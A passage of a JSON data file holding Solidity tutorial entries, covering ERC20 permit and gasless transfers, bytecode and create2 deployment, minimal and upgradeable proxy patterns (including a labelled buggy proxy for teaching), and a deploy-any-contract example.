spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline >= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(\n                recoveredAddress != address(0) && recoveredAddress == owner,\n                \"INVALID_SIGNER\"\n            );\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID\n            ? INITIAL_DOMAIN_SEPARATOR\n            : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(\"1\"),\n                block.chainid,\n                address(this)\n            )\n        );\n    }\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n\n        unchecked {\n            totalSupply -= amount;\n        }\n\n        emit Transfer(from, address(0), amount);\n    }\n}\n\ncontract ERC20Permit is ERC20 {\n    constructor(string memory _name, string memory _symbol, uint8 _decimals)\n        ERC20(_name, _symbol, _decimals)\n    {}\n\n    function mint(address to, uint256 amount) public {\n        _mint(to, amount);\n    }\n}\n"
      },
      {
        "fileName": "GaslessTokenTransfer.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20Permit {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\ncontract GaslessTokenTransfer {\n    function send(\n        address token,\n        address sender,\n        address receiver,\n        uint256 amount,\n        uint256 fee,\n        uint256 deadline,\n        // Permit signature\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // Permit\n        IERC20Permit(token).permit(\n            sender, address(this), amount + fee, deadline, v, r, s\n        );\n        // Send amount to receiver\n        IERC20Permit(token).transferFrom(sender, receiver, amount);\n        // Take fee - send fee to msg.sender\n        IERC20Permit(token).transferFrom(sender, msg.sender, fee);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "gasless",
      "token",
      "transfer",
      "ERC20",
      "permit"
    ],
    "order": 7
  },
  {
    "slug": "simple-bytecode-contract",
    "title": "Simple Bytecode Contract",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Simple example of contract written in bytecode",
    "content": "Simple example of contract written in bytecode\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Factory {\n    event Log(address addr);\n\n    // Deploys a contract that always returns 255\n    function deploy() external {\n        bytes memory bytecode = hex\"6960ff60005260206000f3600052600a6016f3\";\n        address addr;\n        assembly {\n            // create(value, offset, size)\n            addr := create(0, add(bytecode, 0x20), 0x13)\n        }\n        require(addr != address(0));\n\n        emit Log(addr);\n    }\n}\n\ninterface IContract {\n    function getValue() external view returns (uint256);\n}\n\n// https://www.evm.codes/playground\n/*\nRun time code - return 255\n60ff60005260206000f3\n\n// Store 255 to memory\nmstore(p, v) - store v at memory p to p + 32\n\nPUSH1 0xff\nPUSH1 0\nMSTORE\n\n// Return 32 bytes from memory\nreturn(p, s) - end execution and return data from memory p to p + s\n\nPUSH1 0x20\nPUSH1 0\nRETURN\n\nCreation code - return runtime code\n6960ff60005260206000f3600052600a6016f3\n\n// Store run time code to memory\nPUSH10 0X60ff60005260206000f3\nPUSH1 0\nMSTORE\n\n// Return 10 bytes from memory starting at offset 22\nPUSH1 0x0a\nPUSH1 0x16\nRETURN\n*/\n\n```",
    "codes": [
      {
        "fileName": "Factory.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Factory {\n    event Log(address addr);\n\n    // Deploys a contract that always returns 255\n    function deploy() external {\n        bytes memory bytecode = hex\"6960ff60005260206000f3600052600a6016f3\";\n        address addr;\n        assembly {\n            // create(value, offset, size)\n            addr := create(0, add(bytecode, 0x20), 0x13)\n        }\n        require(addr != address(0));\n\n        emit Log(addr);\n    }\n}\n\ninterface IContract {\n    function getValue() external view returns (uint256);\n}\n\n// https://www.evm.codes/playground\n/*\nRun time code - return 255\n60ff60005260206000f3\n\n// Store 255 to memory\nmstore(p, v) - store v at memory p to p + 32\n\nPUSH1 0xff\nPUSH1 0\nMSTORE\n\n// Return 32 bytes from memory\nreturn(p, s) - end execution and return data from memory p to p + s\n\nPUSH1 0x20\nPUSH1 0\nRETURN\n\nCreation code - return runtime code\n6960ff60005260206000f3600052600a6016f3\n\n// Store run time code to memory\nPUSH10 0X60ff60005260206000f3\nPUSH1 0\nMSTORE\n\n// Return 10 bytes from memory starting at offset 22\nPUSH1 0x0a\nPUSH1 0x16\nRETURN\n*/\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "simple",
      "bytecode",
      "contract"
    ],
    "order": 8
  },
  {
    "slug": "create2",
    "title": "Precompute Contract Address with Create2",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Precompute contract address with create2",
    "content": "Contract address can be precomputed, before the contract is deployed, using `create2`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Factory {\n    // Returns the address of the newly deployed contract\n    function deploy(address _owner, uint256 _foo, bytes32 _salt)\n        public\n        payable\n        returns (address)\n    {\n        // This syntax is a newer way to invoke create2 without assembly, you just need to pass salt\n        // https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2\n        return address(new TestContract{salt: _salt}(_owner, _foo));\n    }\n}\n\n// This is the older way of doing it using assembly\ncontract FactoryAssembly {\n    event Deployed(address addr, uint256 salt);\n\n    // 1. Get bytecode of contract to be deployed\n    // NOTE: _owner and _foo are arguments of the TestContract's constructor\n    function getBytecode(address _owner, uint256 _foo)\n        public\n        pure\n        returns (bytes memory)\n    {\n        bytes memory bytecode = type(TestContract).creationCode;\n\n        return abi.encodePacked(bytecode, abi.encode(_owner, _foo));\n    }\n\n    // 2. Compute the address of the contract to be deployed\n    // NOTE: _salt is a random number used to create an address\n    function getAddress(bytes memory bytecode, uint256 _salt)\n        public\n        view\n        returns (address)\n    {\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                bytes1(0xff), address(this), _salt, keccak256(bytecode)\n            )\n        );\n\n        // NOTE: cast last 20 bytes of hash to address\n        return address(uint160(uint256(hash)));\n    }\n\n    // 3. Deploy the contract\n    // NOTE:\n    // Check the event log Deployed which contains the address of the deployed TestContract.\n    // The address in the log should equal the address computed from above.\n    function deploy(bytes memory bytecode, uint256 _salt) public payable {\n        address addr;\n\n        /*\n        NOTE: How to call create2\n\n        create2(v, p, n, s)\n        create new contract with code at memory p to p + n\n        and send v wei\n        and return the new address\n        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))\n              s = big-endian 256-bit value\n        */\n        assembly {\n            addr :=\n                create2(\n                    callvalue(), // wei sent with current call\n                    // Actual code starts after skipping the first 32 bytes\n                    add(bytecode, 0x20),\n                    mload(bytecode), // Load the size of code contained in the first 32 bytes\n                    _salt // Salt from function arguments\n                )\n\n            if iszero(extcodesize(addr)) { revert(0, 0) }\n        }\n\n        emit Deployed(addr, _salt);\n    }\n}\n\ncontract TestContract {\n    address public owner;\n    uint256 public foo;\n\n    constructor(address _owner, uint256 _foo) payable {\n        owner = _owner;\n        foo = _foo;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Create2.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Factory {\n    // Returns the address of the newly deployed contract\n    function deploy(address _owner, uint256 _foo, bytes32 _salt)\n        public\n        payable\n        returns (address)\n    {\n        // This syntax is a newer way to invoke create2 without assembly, you just need to pass salt\n        // https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2\n        return address(new TestContract{salt: _salt}(_owner, _foo));\n    }\n}\n\n// This is the older way of doing it using assembly\ncontract FactoryAssembly {\n    event Deployed(address addr, uint256 salt);\n\n    // 1. Get bytecode of contract to be deployed\n    // NOTE: _owner and _foo are arguments of the TestContract's constructor\n    function getBytecode(address _owner, uint256 _foo)\n        public\n        pure\n        returns (bytes memory)\n    {\n        bytes memory bytecode = type(TestContract).creationCode;\n\n        return abi.encodePacked(bytecode, abi.encode(_owner, _foo));\n    }\n\n    // 2. Compute the address of the contract to be deployed\n    // NOTE: _salt is a random number used to create an address\n    function getAddress(bytes memory bytecode, uint256 _salt)\n        public\n        view\n        returns (address)\n    {\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                bytes1(0xff), address(this), _salt, keccak256(bytecode)\n            )\n        );\n\n        // NOTE: cast last 20 bytes of hash to address\n        return address(uint160(uint256(hash)));\n    }\n\n    // 3. Deploy the contract\n    // NOTE:\n    // Check the event log Deployed which contains the address of the deployed TestContract.\n    // The address in the log should equal the address computed from above.\n    function deploy(bytes memory bytecode, uint256 _salt) public payable {\n        address addr;\n\n        /*\n        NOTE: How to call create2\n\n        create2(v, p, n, s)\n        create new contract with code at memory p to p + n\n        and send v wei\n        and return the new address\n        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))\n              s = big-endian 256-bit value\n        */\n        assembly {\n            addr :=\n                create2(\n                    callvalue(), // wei sent with current call\n                    // Actual code starts after skipping the first 32 bytes\n                    add(bytecode, 0x20),\n                    mload(bytecode), // Load the size of code contained in the first 32 bytes\n                    _salt // Salt from function arguments\n                )\n\n            if iszero(extcodesize(addr)) { revert(0, 0) }\n        }\n\n        emit Deployed(addr, _salt);\n    }\n}\n\ncontract TestContract {\n    address public owner;\n    uint256 public foo;\n\n    constructor(address _owner, uint256 _foo) payable {\n        owner = _owner;\n        foo = _foo;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "create2",
      "precompute",
      "contract",
      "address"
    ],
    "order": 9
  },
  {
    "slug": "minimal-proxy",
    "title": "Minimal Proxy Contract",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Deploy contracts cheaply with minimal proxy contract",
    "content": "If you have a contract that will be deployed multiple times, use minimal proxy contract to deploy them cheaply.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// original code\n// https://github.com/optionality/clone-factory/blob/master/contracts/CloneFactory.sol\n\ncontract MinimalProxy {\n    function clone(address target) external returns (address result) {\n        // convert address to 20 bytes\n        bytes20 targetBytes = bytes20(target);\n\n        // actual code //\n        // 3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3\n\n        // creation code //\n        // copy runtime code into memory and return it\n        // 3d602d80600a3d3981f3\n\n        // runtime code //\n        // code to delegatecall to address\n        // 363d3d373d3d3d363d73 address 5af43d82803e903d91602b57fd5bf3\n\n        assembly {\n            /*\n            reads the 32 bytes of memory starting at pointer stored in 0x40\n\n            In solidity, the 0x40 slot in memory is special: it contains the \"free memory pointer\"\n            which points to the end of the currently allocated memory.\n            */\n            let clone := mload(0x40)\n            // store 32 bytes to memory starting at \"clone\"\n            mstore(\n                clone,\n                0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000\n            )\n\n            /*\n              |              20 bytes                |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000\n                                                      ^\n                                                      pointer\n            */\n            // store 32 bytes to memory starting at \"clone\" + 20 bytes\n            // 0x14 = 20\n            mstore(add(clone, 0x14), targetBytes)\n\n            /*\n              |               20 bytes               |                 20 bytes              |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe\n                                                                                              ^\n                                                                                              pointer\n            */\n            // store 32 bytes to memory starting at \"clone\" + 40 bytes\n            // 0x28 = 40\n            mstore(\n                add(clone, 0x28),\n                0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000\n            )\n\n            /*\n              |               20 bytes               |                 20 bytes              |           15 bytes          |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3\n            */\n            // create new contract\n            // send 0 Ether\n            // code starts at pointer stored in \"clone\"\n            // code size 0x37 (55 bytes)\n            result := create(0, clone, 0x37)\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "MinimalProxy.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// original code\n// https://github.com/optionality/clone-factory/blob/master/contracts/CloneFactory.sol\n\ncontract MinimalProxy {\n    function clone(address target) external returns (address result) {\n        // convert address to 20 bytes\n        bytes20 targetBytes = bytes20(target);\n\n        // actual code //\n        // 3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3\n\n        // creation code //\n        // copy runtime code into memory and return it\n        // 3d602d80600a3d3981f3\n\n        // runtime code //\n        // code to delegatecall to address\n        // 363d3d373d3d3d363d73 address 5af43d82803e903d91602b57fd5bf3\n\n        assembly {\n            /*\n            reads the 32 bytes of memory starting at pointer stored in 0x40\n\n            In solidity, the 0x40 slot in memory is special: it contains the \"free memory pointer\"\n            which points to the end of the currently allocated memory.\n            */\n            let clone := mload(0x40)\n            // store 32 bytes to memory starting at \"clone\"\n            mstore(\n                clone,\n                0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000\n            )\n\n            /*\n              |              20 bytes                |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000\n                                                      ^\n                                                      pointer\n            */\n            // store 32 bytes to memory starting at \"clone\" + 20 bytes\n            // 0x14 = 20\n            mstore(add(clone, 0x14), targetBytes)\n\n            /*\n              |               20 bytes               |                 20 bytes              |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe\n                                                                                              ^\n                                                                                              pointer\n            */\n            // store 32 bytes to memory starting at \"clone\" + 40 bytes\n            // 0x28 = 40\n            mstore(\n                add(clone, 0x28),\n                0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000\n            )\n\n            /*\n              |               20 bytes               |                 20 bytes              |           15 bytes          |\n            0x3d602d80600a3d3981f3363d3d373d3d3d363d73bebebebebebebebebebebebebebebebebebebebe5af43d82803e903d91602b57fd5bf3\n            */\n            // create new contract\n            // send 0 Ether\n            // code starts at pointer stored in \"clone\"\n            // code size 0x37 (55 bytes)\n            result := create(0, clone, 0x37)\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "minimal",
      "proxy",
      "contract"
    ],
    "order": 10
  },
  {
    "slug": "upgradeable-proxy",
    "title": "Upgradeable Proxy",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Example of upgradeable proxy",
    "content": "Example of upgradeable proxy contract. Never use this in production.\n\nThis example shows\n\n- how to use `delegatecall` and return data when `fallback` is called.\n- how to store addresses of `admin` and `implementation` in a specific slot.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Transparent upgradeable proxy pattern\n\ncontract CounterV1 {\n    uint256 public count;\n\n    function inc() external {\n        count += 1;\n    }\n}\n\ncontract CounterV2 {\n    uint256 public count;\n\n    function inc() external {\n        count += 1;\n    }\n\n    function dec() external {\n        count -= 1;\n    }\n}\n\ncontract BuggyProxy {\n    address public implementation;\n    address public admin;\n\n    constructor() {\n        admin = msg.sender;\n    }\n\n    function _delegate() private {\n        (bool ok,) = implementation.delegatecall(msg.data);\n        require(ok, \"delegatecall failed\");\n    }\n\n    fallback() external payable {\n        _delegate();\n    }\n\n    receive() external payable {\n        _delegate();\n    }\n\n    function upgradeTo(address _implementation) external {\n        require(msg.sender == admin, \"not authorized\");\n        implementation = _implementation;\n    }\n}\n\ncontract Dev {\n    function selectors() external view returns (bytes4, bytes4, bytes4) {\n        return (\n            Proxy.admin.selector,\n            Proxy.implementation.selector,\n            Proxy.upgradeTo.selector\n        );\n    }\n}\n\ncontract Proxy {\n    // All functions / variables should be private, forward all calls to fallback\n\n    // -1 for unknown preimage\n    // 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\n    bytes32 private constant IMPLEMENTATION_SLOT =\n        bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1);\n    // 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103\n    bytes32 private constant ADMIN_SLOT =\n        bytes32(uint256(keccak256(\"eip1967.proxy.admin\")) - 1);\n\n    constructor() {\n        _setAdmin(msg.sender);\n    }\n\n    modifier ifAdmin() {\n        if (msg.sender == _getAdmin()) {\n            _;\n        } else {\n            _fallback();\n        }\n    }\n\n    function _getAdmin() private view returns (address) {\n        return StorageSlot.getAddressSlot(ADMIN_SLOT).value;\n    }\n\n    function _setAdmin(address _admin) private {\n        require(_admin != address(0), \"admin = zero address\");\n        StorageSlot.getAddressSlot(ADMIN_SLOT).value = _admin;\n    }\n\n    function _getImplementation() private view returns (address) {\n        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;\n    }\n\n    function _setImplementation(address _implementation) private {\n        require(\n            _implementation.code.length > 0, \"implementation is not a contract\"\n        );\n        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = _implementation;\n    }\n\n    // Admin interface //\n    function changeAdmin(address _admin) external ifAdmin {\n        _setAdmin(_admin);\n    }\n\n    // 0x3659cfe6\n    function upgradeTo(address _implementation) external ifAdmin {\n        _setImplementation(_implementation);\n    }\n\n    // 0xf851a440\n    function admin() external ifAdmin returns (address) {\n        return _getAdmin();\n    }\n\n    // 0x5c60da1b\n    function implementation() external ifAdmin returns (address) {\n        return _getImplementation();\n    }\n\n    // User interface //\n    function _delegate(address _implementation) internal virtual {\n        assembly {\n            // Copy msg.data. We take full control of memory in this inline assembly\n            // block because it will not return to Solidity code. We overwrite the\n            // Solidity scratch pad at memory position 0.\n\n            // calldatacopy(t, f, s) - copy s bytes from calldata at position f to mem at position t\n            // calldatasize() - size of call data in bytes\n            calldatacopy(0, 0, calldatasize())\n\n            // Call the implementation.\n            // out and outsize are 0 because we don't know the size yet.\n\n            // delegatecall(g, a, in, insize, out, outsize) -\n            // - call contract at address a\n            // - with input mem[in…(in+insize))\n            // - providing g gas\n            // - and output area mem[out…(out+outsize))\n            // - returning 0 on error (eg. out of gas) and 1 on success\n            let result :=\n                delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)\n\n            // Copy the returned data.\n            // returndatacopy(t, f, s) - copy s bytes from returndata at position f to mem at position t\n            // returndatasize() - size of the last returndata\n            returndatacopy(0, 0, returndatasize())\n\n            switch result\n            // delegatecall returns 0 on error.\n            case 0 {\n                // revert(p, s) - end execution, revert state changes, return data mem[p…(p+s))\n                revert(0, returndatasize())\n            }\n            default {\n                // return(p, s) - end execution, return data mem[p…(p+s))\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    function _fallback() private {\n        _delegate(_getImplementation());\n    }\n\n    fallback() external payable {\n        _fallback();\n    }\n\n    receive() external payable {\n        _fallback();\n    }\n}\n\ncontract ProxyAdmin {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"not owner\");\n        _;\n    }\n\n    function getProxyAdmin(address proxy) external view returns (address) {\n        (bool ok, bytes memory res) =\n            proxy.staticcall(abi.encodeCall(Proxy.admin, ()));\n        require(ok, \"call failed\");\n        return abi.decode(res, (address));\n    }\n\n    function getProxyImplementation(address proxy)\n        external\n        view\n        returns (address)\n    {\n        (bool ok, bytes memory res) =\n            proxy.staticcall(abi.encodeCall(Proxy.implementation, ()));\n        require(ok, \"call failed\");\n        return abi.decode(res, (address));\n    }\n\n    function changeProxyAdmin(address payable proxy, address admin)\n        external\n        onlyOwner\n    {\n        Proxy(proxy).changeAdmin(admin);\n    }\n\n    function upgrade(address payable proxy, address implementation)\n        external\n        onlyOwner\n    {\n        Proxy(proxy).upgradeTo(implementation);\n    }\n}\n\nlibrary StorageSlot {\n    struct AddressSlot {\n        address value;\n    }\n\n    function getAddressSlot(bytes32 slot)\n        internal\n        pure\n        returns (AddressSlot storage r)\n    {\n        assembly {\n            r.slot := slot\n        }\n    }\n}\n\ncontract TestSlot {\n    bytes32 public constant slot = keccak256(\"TEST_SLOT\");\n\n    function getSlot() external view returns (address) {\n        return StorageSlot.getAddressSlot(slot).value;\n    }\n\n    function writeSlot(address _addr) external {\n        StorageSlot.getAddressSlot(slot).value = _addr;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "UpgradeableProxy.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// Transparent upgradeable proxy pattern\n\ncontract CounterV1 {\n    uint256 public count;\n\n    function inc() external {\n        count += 1;\n    }\n}\n\ncontract CounterV2 {\n    uint256 public count;\n\n    function inc() external {\n        count += 1;\n    }\n\n    function dec() external {\n        count -= 1;\n    }\n}\n\ncontract BuggyProxy {\n    address public implementation;\n    address public admin;\n\n    constructor() {\n        admin = msg.sender;\n    }\n\n    function _delegate() private {\n        (bool ok,) = implementation.delegatecall(msg.data);\n        require(ok, \"delegatecall failed\");\n    }\n\n    fallback() external payable {\n        _delegate();\n    }\n\n    receive() external payable {\n        _delegate();\n    }\n\n    function upgradeTo(address _implementation) external {\n        require(msg.sender == admin, \"not authorized\");\n        implementation = _implementation;\n    }\n}\n\ncontract Dev {\n    function selectors() external view returns (bytes4, bytes4, bytes4) {\n        return (\n            Proxy.admin.selector,\n            Proxy.implementation.selector,\n            Proxy.upgradeTo.selector\n        );\n    }\n}\n\ncontract Proxy {\n    // All functions / variables should be private, forward all calls to fallback\n\n    // -1 for unknown preimage\n    // 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\n    bytes32 private constant IMPLEMENTATION_SLOT =\n        bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1);\n    // 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103\n    bytes32 private constant ADMIN_SLOT =\n        bytes32(uint256(keccak256(\"eip1967.proxy.admin\")) - 1);\n\n    constructor() {\n        _setAdmin(msg.sender);\n    }\n\n    modifier ifAdmin() {\n        if (msg.sender == _getAdmin()) {\n            _;\n        } else {\n            _fallback();\n        }\n    }\n\n    function _getAdmin() private view returns (address) {\n        return StorageSlot.getAddressSlot(ADMIN_SLOT).value;\n    }\n\n    function _setAdmin(address _admin) private {\n        require(_admin != address(0), \"admin = zero address\");\n        StorageSlot.getAddressSlot(ADMIN_SLOT).value = _admin;\n    }\n\n    function _getImplementation() private view returns (address) {\n        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;\n    }\n\n    function _setImplementation(address _implementation) private {\n        require(\n            _implementation.code.length > 0, \"implementation is not a contract\"\n        );\n        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = _implementation;\n    }\n\n    // Admin interface //\n    function changeAdmin(address _admin) external ifAdmin {\n        _setAdmin(_admin);\n    }\n\n    // 0x3659cfe6\n    function upgradeTo(address _implementation) external ifAdmin {\n        _setImplementation(_implementation);\n    }\n\n    // 0xf851a440\n    function admin() external ifAdmin returns (address) {\n        return _getAdmin();\n    }\n\n    // 0x5c60da1b\n    function implementation() external ifAdmin returns (address) {\n        return _getImplementation();\n    }\n\n    // User interface //\n    function _delegate(address _implementation) internal virtual {\n        assembly {\n            // Copy msg.data. We take full control of memory in this inline assembly\n            // block because it will not return to Solidity code. We overwrite the\n            // Solidity scratch pad at memory position 0.\n\n            // calldatacopy(t, f, s) - copy s bytes from calldata at position f to mem at position t\n            // calldatasize() - size of call data in bytes\n            calldatacopy(0, 0, calldatasize())\n\n            // Call the implementation.\n            // out and outsize are 0 because we don't know the size yet.\n\n            // delegatecall(g, a, in, insize, out, outsize) -\n            // - call contract at address a\n            // - with input mem[in…(in+insize))\n            // - providing g gas\n            // - and output area mem[out…(out+outsize))\n            // - returning 0 on error (eg. out of gas) and 1 on success\n            let result :=\n                delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)\n\n            // Copy the returned data.\n            // returndatacopy(t, f, s) - copy s bytes from returndata at position f to mem at position t\n            // returndatasize() - size of the last returndata\n            returndatacopy(0, 0, returndatasize())\n\n            switch result\n            // delegatecall returns 0 on error.\n            case 0 {\n                // revert(p, s) - end execution, revert state changes, return data mem[p…(p+s))\n                revert(0, returndatasize())\n            }\n            default {\n                // return(p, s) - end execution, return data mem[p…(p+s))\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    function _fallback() private {\n        _delegate(_getImplementation());\n    }\n\n    fallback() external payable {\n        _fallback();\n    }\n\n    receive() external payable {\n        _fallback();\n    }\n}\n\ncontract ProxyAdmin {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"not owner\");\n        _;\n    }\n\n    function getProxyAdmin(address proxy) external view returns (address) {\n        (bool ok, bytes memory res) =\n            proxy.staticcall(abi.encodeCall(Proxy.admin, ()));\n        require(ok, \"call failed\");\n        return abi.decode(res, (address));\n    }\n\n    function getProxyImplementation(address proxy)\n        external\n        view\n        returns (address)\n    {\n        (bool ok, bytes memory res) =\n            proxy.staticcall(abi.encodeCall(Proxy.implementation, ()));\n        require(ok, \"call failed\");\n        return abi.decode(res, (address));\n    }\n\n    function changeProxyAdmin(address payable proxy, address admin)\n        external\n        onlyOwner\n    {\n        Proxy(proxy).changeAdmin(admin);\n    }\n\n    function upgrade(address payable proxy, address implementation)\n        external\n        onlyOwner\n    {\n        Proxy(proxy).upgradeTo(implementation);\n    }\n}\n\nlibrary StorageSlot {\n    struct AddressSlot {\n        address value;\n    }\n\n    function getAddressSlot(bytes32 slot)\n        internal\n        pure\n        returns (AddressSlot storage r)\n    {\n        assembly {\n            r.slot := slot\n        }\n    }\n}\n\ncontract TestSlot {\n    bytes32 public constant slot = keccak256(\"TEST_SLOT\");\n\n    function getSlot() external view returns (address) {\n        return StorageSlot.getAddressSlot(slot).value;\n    }\n\n    function writeSlot(address _addr) external {\n        StorageSlot.getAddressSlot(slot).value = _addr;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "delegatecall",
      "upgradeable",
      "proxy"
    ],
    "order": 11
  },
  {
    "slug": "deploy-any-contract",
    "title": "Deploy Any Contract",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Deploy Any Contract",
    "content": "Deploy any contract by calling `Proxy.deploy(bytes memory _code)`\n\nFor this example, you can get the contract bytecodes by calling `Helper.getBytecode1` and `Helper.getBytecode2`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Proxy {\n    event Deploy(address);\n\n    receive() external payable {}\n\n    function deploy(bytes memory _code)\n        external\n        payable\n        returns (address addr)\n    {\n        assembly {\n            // create(v, p, n)\n            // v = amount of ETH to send\n            // p = pointer in memory to start of code\n            // n = size of code\n            addr := create(callvalue(), add(_code, 0x20), mload(_code))\n        }\n        // return address 0 on error\n        require(addr != address(0), \"deploy failed\");\n\n        emit Deploy(addr);\n    }\n\n    function execute(address _target, bytes memory _data) external payable {\n        (bool success,) = _target.call{value: msg.value}(_data);\n        require(success, \"failed\");\n    }\n}\n\ncontract TestContract1 {\n    address public owner = msg.sender;\n\n    function setOwner(address _owner) public {\n        require(msg.sender == owner, \"not owner\");\n        owner = _owner;\n    }\n}\n\ncontract TestContract2 {\n    address public owner = msg.sender;\n    uint256 public value = msg.value;\n    uint256 public x;\n    uint256 public y;\n\n    constructor(uint256 _x, uint256 _y) payable {\n        x = _x;\n        y = _y;\n    }\n}\n\ncontract Helper {\n    function getBytecode1() external pure returns (bytes memory) {\n        bytes memory bytecode = type(TestContract1).creationCode;\n        return bytecode;\n    }\n\n    function getBytecode2(uint256 _x, uint256 _y)\n        external\n        pure\n        returns (bytes memory)\n    {\n        bytes memory bytecode = type(TestContract2).creationCode;\n        return abi.encodePacked(bytecode, abi.encode(_x, _y));\n    }\n\n    function getCalldata(address _owner) external pure returns (bytes memory) {\n        return abi.encodeWithSignature(\"setOwner(address)\", _owner);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Proxy.sol",
